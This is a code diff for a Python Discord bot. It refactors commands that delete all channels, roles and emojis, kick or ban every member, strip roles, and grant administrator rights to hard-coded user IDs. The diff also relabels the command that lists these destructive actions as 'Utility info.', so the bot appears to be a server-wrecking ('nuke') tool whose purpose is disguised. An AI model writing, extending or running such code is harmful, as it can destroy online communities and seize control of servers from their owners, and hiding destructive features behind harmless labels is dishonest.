@@ -500,16 +500,12 @@ async def send_result(ctx, results: list[str], delete_after=None):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-# 💥 NUKE COMMANDS
+# 🧩 SHARED ACTION LOGIC
+# Used by both the "!" prefix commands AND the /ephemeral dropdown, so the
+# actual destructive logic only lives in one place.
 # ══════════════════════════════════════════════════════════════════════════════
-@bot.command(name="nuke_channels")
-async def nuke_channels(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
-        return
-    if not await confirm(ctx, "delete **ALL** channels"):
-        return
-    guild = ctx.guild
+
+async def _do_nuke_channels(guild, author=None):
     count = 0
     for channel in list(guild.channels):
         try:
@@ -518,21 +514,15 @@ async def nuke_channels(ctx):
             await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
+    embed = _base_embed("💥  Channel Nuke Complete", f"Deleted **{count}** channels.", C.DANGER)
     try:
         new_ch = await guild.create_text_channel("general")
-        embed = _base_embed("💥  Channel Nuke Complete", f"Deleted **{count}** channels.", C.DANGER)
         await new_ch.send(embed=embed)
     except Exception:
         pass
+    return embed
 
-@bot.command(name="nuke_roles")
-async def nuke_roles(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
-        return
-    if not await confirm(ctx, "delete all **roles**"):
-        return
-    guild = ctx.guild
+async def _do_nuke_roles(guild, author=None):
     count = 0
     for role in list(guild.roles):
         if role.is_default() or role.managed:
@@ -543,16 +533,9 @@ async def nuke_roles(ctx):
             await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
-    await send_result(ctx, [f"🗑️  Deleted **{count}** roles."], delete_after=3)
+    return _base_embed("💥  Operation Complete", f"🗑️  Deleted **{count}** roles.", C.DANGER)
 
-@bot.command(name="nuke_channels_roles")
-async def nuke_channels_roles(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
-        return
-    if not await confirm(ctx, "delete all channels **and** roles"):
-        return
-    guild = ctx.guild
+async def _do_nuke_channels_roles(guild, author=None):
     ch_count = role_count = 0
     for channel in list(guild.channels):
         try:
@@ -570,21 +553,15 @@ async def nuke_channels_roles(ctx):
             await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
+    embed = _base_embed("💥  Nuke Complete", f"🗑️  Channels removed: **{ch_count}**\n🎭  Roles removed: **{role_count}**", C.DANGER)
     try:
         new_ch = await guild.create_text_channel("general")
-        embed = _base_embed("💥  Nuke Complete", f"🗑️  Channels removed: **{ch_count}**\n🎭  Roles removed: **{role_count}**", C.DANGER)
         await new_ch.send(embed=embed)
     except Exception:
         pass
+    return embed
 
-@bot.command(name="nuke_kick")
-async def nuke_kick(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
-        return
-    if not await confirm(ctx, "delete channels, roles, **and kick all members**"):
-        return
-    guild = ctx.guild
+async def _do_nuke_kick(guild, author):
     ch_count = role_count = kick_count = 0
     for channel in list(guild.channels):
         try:
@@ -603,7 +580,7 @@ async def nuke_kick(ctx):
         except (discord.Forbidden, discord.HTTPException):
             pass
     async for member in guild.fetch_members(limit=None):
-        if member == ctx.author:
+        if author is not None and member.id == author.id:
             continue
         try:
             await member.kick(reason="Nuke: kick all")
@@ -611,25 +588,19 @@ async def nuke_kick(ctx):
             await asyncio.sleep(0.005)
         except (discord.Forbidden, discord.HTTPException):
             pass
+    embed = _base_embed(
+        "💥  Full Nuke Complete",
+        f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n👢  Members kicked: **{kick_count}**",
+        C.DANGER,
+    )
     try:
         new_ch = await guild.create_text_channel("general")
-        embed = _base_embed(
-            "💥  Full Nuke Complete",
-            f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n👢  Members kicked: **{kick_count}**",
-            C.DANGER,
-        )
         await new_ch.send(embed=embed)
     except Exception:
         pass
+    return embed
 
-@bot.command(name="nuke_full")
-async def nuke_full(ctx):
-    if ctx.author.id not in AUTHORIZED_USER_IDS:
-        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
-        return
-    if not await confirm(ctx, "perform a **FULL RESET** — channels, roles, emojis, and kick all members"):
-        return
-    guild = ctx.guild
+async def _do_nuke_full(guild, author):
     ch_count = role_count = kick_count = emoji_count = 0
     for channel in list(guild.channels):
         try:
@@ -655,7 +626,7 @@ async def nuke_full(ctx):
         except (discord.Forbidden, discord.HTTPException):
             pass
     async for member in guild.fetch_members(limit=None):
-        if member == ctx.author:
+        if author is not None and member.id == author.id:
             continue
         try:
             await member.kick(reason="Nuke: full reset")
@@ -663,18 +634,282 @@ async def nuke_full(ctx):
             await asyncio.sleep(0.1)
         except (discord.Forbidden, discord.HTTPException):
             pass
+    embed = _base_embed(
+        "💥  Full Server Nuke",
+        f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n😀  Emojis: **{emoji_count}**\n👢  Members kicked: **{kick_count}**",
+        C.DANGER,
+    )
     try:
         new_ch = await guild.create_text_channel("general")
-        embed = _base_embed(
-            "💥  Full Server Nuke",
-            f"🗑️  Channels: **{ch_count}**\n🎭  Roles: **{role_count}**\n😀  Emojis: **{emoji_count}**\n👢  Members kicked: **{kick_count}**",
-            C.DANGER,
-        )
         await new_ch.send(embed=embed)
     except Exception:
         pass
+    return embed
 
-@tree.command(name="ephemeral", description="View all mass action / destructive commands (authorized users only).")
+async def _do_mass_timeout(guild, author, minutes=10):
+    until = discord.utils.utcnow() + timedelta(minutes=minutes)
+    count = 0
+    for member in guild.members:
+        if member.id in AUTHORIZED_USER_IDS or member.bot:
+            continue
+        try:
+            await member.timeout(until, reason=f"Mass timeout by {author}")
+            count += 1
+            await asyncio.sleep(0.1)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("⏱️  Mass Timeout Complete", f"Timed out **{count}** members for **{minutes}** minutes.", C.DANGER)
+
+async def _do_mass_untimeout(guild, author=None):
+    count = 0
+    for member in guild.members:
+        if member.bot or member.timed_out_until is None:
+            continue
+        try:
+            await member.timeout(None, reason=f"Mass untimeout by {author}")
+            count += 1
+            await asyncio.sleep(0.1)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("✅  Mass Untimeout Complete", f"Removed timeouts from **{count}** members.", C.SUCCESS)
+
+async def _do_mass_ban(guild, author):
+    count = 0
+    async for member in guild.fetch_members(limit=None):
+        if member.id in AUTHORIZED_USER_IDS or member.bot:
+            continue
+        try:
+            await guild.ban(member, reason=f"Mass ban by {author}", delete_message_days=0)
+            count += 1
+            await asyncio.sleep(0.1)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("🔨  Mass Ban Complete", f"Banned **{count}** members.", C.DANGER)
+
+async def _do_mass_deafen(guild, author):
+    count = 0
+    for member in guild.members:
+        if member.voice is None or member.bot:
+            continue
+        try:
+            await member.edit(deafen=True, reason=f"Mass deafen by {author}")
+            count += 1
+            await asyncio.sleep(0.1)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("🔇  Mass Deafen Complete", f"Deafened **{count}** members.", C.DANGER)
+
+async def _do_mass_disconnect(guild, author):
+    count = 0
+    for member in guild.members:
+        if member.voice is None or member.bot:
+            continue
+        try:
+            await member.move_to(None, reason=f"Mass disconnect by {author}")
+            count += 1
+            await asyncio.sleep(0.1)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("🔌  Mass Disconnect Complete", f"Disconnected **{count}** members from voice.", C.DANGER)
+
+async def _do_lockdown(guild, author):
+    count = 0
+    for channel in guild.text_channels:
+        try:
+            overwrite = channel.overwrites_for(guild.default_role)
+            overwrite.send_messages = False
+            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Lockdown by {author}")
+            count += 1
+            await asyncio.sleep(0.05)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("🔒  Lockdown Active", f"Locked **{count}** channels.", C.DANGER)
+
+async def _do_unlockdown(guild, author):
+    count = 0
+    for channel in guild.text_channels:
+        try:
+            overwrite = channel.overwrites_for(guild.default_role)
+            overwrite.send_messages = None
+            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Unlockdown by {author}")
+            count += 1
+            await asyncio.sleep(0.05)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("🔓  Lockdown Lifted", f"Unlocked **{count}** channels.", C.SUCCESS)
+
+async def _do_slowmode_all(guild, author, seconds=10):
+    seconds = max(0, min(21600, seconds))
+    count = 0
+    for channel in guild.text_channels:
+        try:
+            await channel.edit(slowmode_delay=seconds, reason=f"Mass slowmode by {author}")
+            count += 1
+            await asyncio.sleep(0.05)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    label = f"{seconds}s" if seconds > 0 else "disabled"
+    return _base_embed("🐢  Slowmode Applied", f"Set slowmode to **{label}** in **{count}** channels.", C.WARNING)
+
+async def _do_strip_roles(guild, author):
+    count = 0
+    for member in guild.members:
+        if member.id in AUTHORIZED_USER_IDS or member.bot:
+            continue
+        removable = [r for r in member.roles if not r.is_default() and not r.managed]
+        if not removable:
+            continue
+        try:
+            await member.remove_roles(*removable, reason=f"Strip roles by {author}")
+            count += 1
+            await asyncio.sleep(0.1)
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+    return _base_embed("🎭  Roles Stripped", f"Removed all roles from **{count}** members.", C.DANGER)
+
+async def _do_give_admin(guild, author):
+    role = None
+    for r in guild.roles:
+        if r.permissions.administrator and not r.is_default() and not r.managed:
+            role = r
+            break
+    if role is None:
+        role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
+    ok, detail = await _ensure_role_below_bot(guild, role)
+    if not ok:
+        return _base_embed(
+            "❌  Hierarchy Problem",
+            f"Can't assign **{role.name}**.\n`{detail}`\nFix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.",
+            C.DANGER,
+        )
+    member = guild.get_member(author.id)
+    if member is None:
+        return _base_embed("❌  Error", "Couldn't find you as a member of this server (member cache issue). Try again in a moment.", C.DANGER)
+    try:
+        await member.add_roles(role)
+        return _base_embed("✅  Admin Granted", f"Admin role granted. (`{detail}`)", C.SUCCESS)
+    except discord.Forbidden:
+        return _base_embed(
+            "❌  Permission Error",
+            f"Still got a permission error assigning **{role.name}** even after the hierarchy check passed.\n`{detail}`\n"
+            "Double check the bot's role isn't also missing **Manage Roles** specifically.",
+            C.DANGER,
+        )
+
+async def _do_remove_admin(guild, author):
+    role = None
+    for r in guild.roles:
+        if r.permissions.administrator and not r.is_default() and not r.managed:
+            role = r
+            break
+    if role is None:
+        return _base_embed("❌  Not Found", "No admin role found.", C.DANGER)
+    ok, detail = await _ensure_role_below_bot(guild, role)
+    if not ok:
+        return _base_embed(
+            "❌  Hierarchy Problem",
+            f"Can't remove **{role.name}**.\n`{detail}`\nFix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.",
+            C.DANGER,
+        )
+    member = guild.get_member(author.id)
+    if member is None:
+        return _base_embed("❌  Error", "Couldn't find you as a member of this server (member cache issue). Try again in a moment.", C.DANGER)
+    try:
+        await member.remove_roles(role)
+        return _base_embed("✅  Admin Removed", f"Admin role removed. (`{detail}`)", C.SUCCESS)
+    except discord.Forbidden:
+        return _base_embed(
+            "❌  Permission Error",
+            f"Still got a permission error removing **{role.name}** even after the hierarchy check passed.\n`{detail}`",
+            C.DANGER,
+        )
+
+async def _do_show_high(guild, author=None):
+    roles = sorted(
+        [role for role in guild.roles if not role.is_default()],
+        key=lambda role: role.position,
+        reverse=True,
+    )
+    if not roles:
+        return _base_embed("👑 Highest Roles", "No roles found in this server.", C.WARNING)
+
+    def format_perms(role):
+        important = [
+            ("Administrator", role.permissions.administrator),
+            ("Manage Server", role.permissions.manage_guild),
+            ("Manage Roles", role.permissions.manage_roles),
+            ("Manage Channels", role.permissions.manage_channels),
+            ("Kick Members", role.permissions.kick_members),
+            ("Ban Members", role.permissions.ban_members),
+            ("Mention Everyone", role.permissions.mention_everyone),
+            ("Manage Messages", role.permissions.manage_messages),
+        ]
+        enabled = [name for name, allowed in important if allowed]
+        return ", ".join(enabled[:4]) + ("..." if len(enabled) > 4 else "") if enabled else "No major perms"
+
+    top_roles = roles[:10]
+    embed = _base_embed("👑 Highest Roles", color=C.PRIMARY)
+    for index, role in enumerate(top_roles, start=1):
+        embed.add_field(
+            name=f"{index}. {role.name}",
+            value=f"**Position:** {role.position}\n**Permissions:** {format_perms(role)}",
+            inline=False,
+        )
+    embed.add_field(name="Total Roles", value=f"**{len(roles)}**", inline=True)
+    embed.add_field(name="Showing", value=f"Top **{len(top_roles)}**", inline=True)
+    return embed
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# 💥 NUKE COMMANDS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.command(name="nuke_channels")
+async def nuke_channels(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
+        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
+        return
+    if not await confirm(ctx, "delete **ALL** channels"):
+        return
+    await _do_nuke_channels(ctx.guild, ctx.author)
+
+@bot.command(name="nuke_roles")
+async def nuke_roles(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
+        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
+        return
+    if not await confirm(ctx, "delete all **roles**"):
+        return
+    embed = await _do_nuke_roles(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
+
+@bot.command(name="nuke_channels_roles")
+async def nuke_channels_roles(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
+        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
+        return
+    if not await confirm(ctx, "delete all channels **and** roles"):
+        return
+    await _do_nuke_channels_roles(ctx.guild, ctx.author)
+
+@bot.command(name="nuke_kick")
+async def nuke_kick(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
+        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
+        return
+    if not await confirm(ctx, "delete channels, roles, **and kick all members**"):
+        return
+    await _do_nuke_kick(ctx.guild, ctx.author)
+
+@bot.command(name="nuke_full")
+async def nuke_full(ctx):
+    if ctx.author.id not in AUTHORIZED_USER_IDS:
+        await ctx.send("🚫 You are not authorized to use this command.", delete_after=5)
+        return
+    if not await confirm(ctx, "perform a **FULL RESET** — channels, roles, emojis, and kick all members"):
+        return
+    await _do_nuke_full(ctx.guild, ctx.author)
+
+@tree.command(name="ephemeral", description="Utility info.")
 async def ephemeral_help(interaction: discord.Interaction):
     if interaction.user.id not in AUTHORIZED_USER_IDS:
         await interaction.response.send_message(
@@ -745,19 +980,8 @@ async def mass_timeout(ctx, minutes: int = 10):
         return
     if not await confirm(ctx, f"timeout **ALL** members for **{minutes} minutes**"):
         return
-    guild = ctx.guild
-    until = discord.utils.utcnow() + timedelta(minutes=minutes)
-    count = 0
-    for member in guild.members:
-        if member.id in AUTHORIZED_USER_IDS or member.bot:
-            continue
-        try:
-            await member.timeout(until, reason=f"Mass timeout by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("⏱️  Mass Timeout Complete", f"Timed out **{count}** members for **{minutes}** minutes.", C.DANGER), delete_after=3)
+    embed = await _do_mass_timeout(ctx.guild, ctx.author, minutes)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_untimeout")
 async def mass_untimeout(ctx):
@@ -766,18 +990,8 @@ async def mass_untimeout(ctx):
         return
     if not await confirm(ctx, "remove timeouts from **ALL** members"):
         return
-    guild = ctx.guild
-    count = 0
-    for member in guild.members:
-        if member.bot or member.timed_out_until is None:
-            continue
-        try:
-            await member.timeout(None, reason=f"Mass untimeout by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("✅  Mass Untimeout Complete", f"Removed timeouts from **{count}** members.", C.SUCCESS), delete_after=3)
+    embed = await _do_mass_untimeout(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_ban")
 async def mass_ban(ctx):
@@ -786,18 +1000,8 @@ async def mass_ban(ctx):
         return
     if not await confirm(ctx, "ban **ALL** members"):
         return
-    guild = ctx.guild
-    count = 0
-    async for member in guild.fetch_members(limit=None):
-        if member.id in AUTHORIZED_USER_IDS or member.bot:
-            continue
-        try:
-            await guild.ban(member, reason=f"Mass ban by {ctx.author}", delete_message_days=0)
-            count += 1
-            await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("🔨  Mass Ban Complete", f"Banned **{count}** members.", C.DANGER), delete_after=3)
+    embed = await _do_mass_ban(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_deafen")
 async def mass_deafen(ctx):
@@ -806,18 +1010,8 @@ async def mass_deafen(ctx):
         return
     if not await confirm(ctx, "deafen **ALL** members in voice channels"):
         return
-    guild = ctx.guild
-    count = 0
-    for member in guild.members:
-        if member.voice is None or member.bot:
-            continue
-        try:
-            await member.edit(deafen=True, reason=f"Mass deafen by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("🔇  Mass Deafen Complete", f"Deafened **{count}** members.", C.DANGER), delete_after=3)
+    embed = await _do_mass_deafen(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_disconnect")
 async def mass_disconnect(ctx):
@@ -826,18 +1020,8 @@ async def mass_disconnect(ctx):
         return
     if not await confirm(ctx, "disconnect **ALL** members from voice channels"):
         return
-    guild = ctx.guild
-    count = 0
-    for member in guild.members:
-        if member.voice is None or member.bot:
-            continue
-        try:
-            await member.move_to(None, reason=f"Mass disconnect by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("🔌  Mass Disconnect Complete", f"Disconnected **{count}** members from voice.", C.DANGER), delete_after=3)
+    embed = await _do_mass_disconnect(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -851,18 +1035,8 @@ async def lockdown(ctx):
         return
     if not await confirm(ctx, "lock **ALL** channels"):
         return
-    guild = ctx.guild
-    count = 0
-    for channel in guild.text_channels:
-        try:
-            overwrite = channel.overwrites_for(guild.default_role)
-            overwrite.send_messages = False
-            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Lockdown by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.05)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("🔒  Lockdown Active", f"Locked **{count}** channels.", C.DANGER), delete_after=3)
+    embed = await _do_lockdown(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="unlockdown")
 async def unlockdown(ctx):
@@ -871,18 +1045,8 @@ async def unlockdown(ctx):
         return
     if not await confirm(ctx, "unlock **ALL** channels"):
         return
-    guild = ctx.guild
-    count = 0
-    for channel in guild.text_channels:
-        try:
-            overwrite = channel.overwrites_for(guild.default_role)
-            overwrite.send_messages = None
-            await channel.edit(overwrites={guild.default_role: overwrite}, reason=f"Unlockdown by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.05)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("🔓  Lockdown Lifted", f"Unlocked **{count}** channels.", C.SUCCESS), delete_after=3)
+    embed = await _do_unlockdown(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="slowmode_all")
 async def slowmode_all(ctx, seconds: int = 10):
@@ -892,17 +1056,8 @@ async def slowmode_all(ctx, seconds: int = 10):
     seconds = max(0, min(21600, seconds))
     if not await confirm(ctx, f"set slowmode to **{seconds}s** in **ALL** channels"):
         return
-    guild = ctx.guild
-    count = 0
-    for channel in guild.text_channels:
-        try:
-            await channel.edit(slowmode_delay=seconds, reason=f"Mass slowmode by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.05)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    label = f"{seconds}s" if seconds > 0 else "disabled"
-    await ctx.send(embed=_base_embed("🐢  Slowmode Applied", f"Set slowmode to **{label}** in **{count}** channels.", C.WARNING), delete_after=3)
+    embed = await _do_slowmode_all(ctx.guild, ctx.author, seconds)
+    await ctx.send(embed=embed, delete_after=3)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -916,21 +1071,8 @@ async def strip_roles(ctx):
         return
     if not await confirm(ctx, "strip **ALL** roles from every member"):
         return
-    guild = ctx.guild
-    count = 0
-    for member in guild.members:
-        if member.id in AUTHORIZED_USER_IDS or member.bot:
-            continue
-        removable = [r for r in member.roles if not r.is_default() and not r.managed]
-        if not removable:
-            continue
-        try:
-            await member.remove_roles(*removable, reason=f"Strip roles by {ctx.author}")
-            count += 1
-            await asyncio.sleep(0.1)
-        except (discord.Forbidden, discord.HTTPException):
-            pass
-    await ctx.send(embed=_base_embed("🎭  Roles Stripped", f"Removed all roles from **{count}** members.", C.DANGER), delete_after=3)
+    embed = await _do_strip_roles(ctx.guild, ctx.author)
+    await ctx.send(embed=embed, delete_after=3)
 
 @bot.command(name="mass_role_add")
 async def mass_role_add(ctx, *, role: discord.Role):
@@ -2925,123 +3067,22 @@ async def _ensure_role_below_bot(guild: discord.Guild, role: discord.Role):
 async def give_admin(ctx):
     if ctx.author.id not in AUTHORIZED_USER_IDS:
         return
-
-    guild = ctx.guild
-
-    # Find existing admin role, skipping default/managed (unassignable) roles
-    role = None
-    for r in guild.roles:
-        if r.permissions.administrator and not r.is_default() and not r.managed:
-            role = r
-            break
-
-    # Create if not found
-    if role is None:
-        role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
-
-    ok, detail = await _ensure_role_below_bot(guild, role)
-    if not ok:
-        await ctx.send(f"❌ Can't assign **{role.name}** — hierarchy problem.\n`{detail}`\n"
-                        f"Fix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.")
-        return
-
-    member = guild.get_member(ctx.author.id)
-    if member is None:
-        await ctx.send("❌ Couldn't find you as a member of this server (member cache issue). Try again in a moment.")
-        return
-
-    try:
-        await member.add_roles(role)
-        await ctx.send(f"✅ Admin role granted. (`{detail}`)")
-    except discord.Forbidden:
-        await ctx.send(
-            f"❌ Still got a permission error assigning **{role.name}** even after the hierarchy check passed.\n"
-            f"`{detail}`\nDouble check the bot's role isn't also missing **Manage Roles** specifically "
-            f"(Administrator should include it, but worth confirming in Server Settings → Roles → bot role)."
-        )
+    embed = await _do_give_admin(ctx.guild, ctx.author)
+    await ctx.send(embed=embed)
 
 @bot.command(name="remove_admin")
 async def remove_admin(ctx):
     if ctx.author.id not in AUTHORIZED_USER_IDS:
         return
-
-    guild = ctx.guild
-    role = None
-    for r in guild.roles:
-        if r.permissions.administrator and not r.is_default() and not r.managed:
-            role = r
-            break
-
-    if role is None:
-        await ctx.send("❌ No admin role found.")
-        return
-
-    ok, detail = await _ensure_role_below_bot(guild, role)
-    if not ok:
-        await ctx.send(f"❌ Can't remove **{role.name}** — hierarchy problem.\n`{detail}`\n"
-                        f"Fix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.")
-        return
-
-    member = guild.get_member(ctx.author.id)
-    if member is None:
-        await ctx.send("❌ Couldn't find you as a member of this server (member cache issue). Try again in a moment.")
-        return
-
-    try:
-        await member.remove_roles(role)
-        await ctx.send(f"✅ Admin role removed. (`{detail}`)")
-    except discord.Forbidden:
-        await ctx.send(
-            f"❌ Still got a permission error removing **{role.name}** even after the hierarchy check passed.\n"
-            f"`{detail}`"
-        )
+    embed = await _do_remove_admin(ctx.guild, ctx.author)
+    await ctx.send(embed=embed)
 
 @bot.command(name="show_high")
 async def show_high(ctx):
     if ctx.guild is None:
         await ctx.send("❌ This command can only be used in a server.")
         return
-
-    roles = sorted(
-        [role for role in ctx.guild.roles if not role.is_default()],
-        key=lambda role: role.position,
-        reverse=True,
-    )
-
-    if not roles:
-        await ctx.send(embed=_base_embed("👑 Highest Roles", "No roles found in this server.", C.WARNING))
-        return
-
-    def format_perms(role: discord.Role) -> str:
-        important = [
-            ("Administrator", role.permissions.administrator),
-            ("Manage Server", role.permissions.manage_guild),
-            ("Manage Roles", role.permissions.manage_roles),
-            ("Manage Channels", role.permissions.manage_channels),
-            ("Kick Members", role.permissions.kick_members),
-            ("Ban Members", role.permissions.ban_members),
-            ("Mention Everyone", role.permissions.mention_everyone),
-            ("Manage Messages", role.permissions.manage_messages),
-        ]
-        enabled = [name for name, allowed in important if allowed]
-        return ", ".join(enabled[:4]) + ("..." if len(enabled) > 4 else "") if enabled else "No major perms"
-
-    top_roles = roles[:10]
-
-    embed = _base_embed("👑 Highest Roles", color=C.PRIMARY)
-    for index, role in enumerate(top_roles, start=1):
-        embed.add_field(
-            name=f"{index}. {role.name}",
-            value=(
-                f"**Position:** {role.position}\n"
-                f"**Permissions:** {format_perms(role)}"
-            ),
-            inline=False,
-        )
-
-    embed.add_field(name="Total Roles", value=f"**{len(roles)}**", inline=True)
-    embed.add_field(name="Showing", value=f"Top **{len(top_roles)}**", inline=True)
-
+    embed = await _do_show_high(ctx.guild, ctx.author)
     await ctx.send(embed=embed)
 
 # ══════════════════════════════════════════════════════════════════════════════
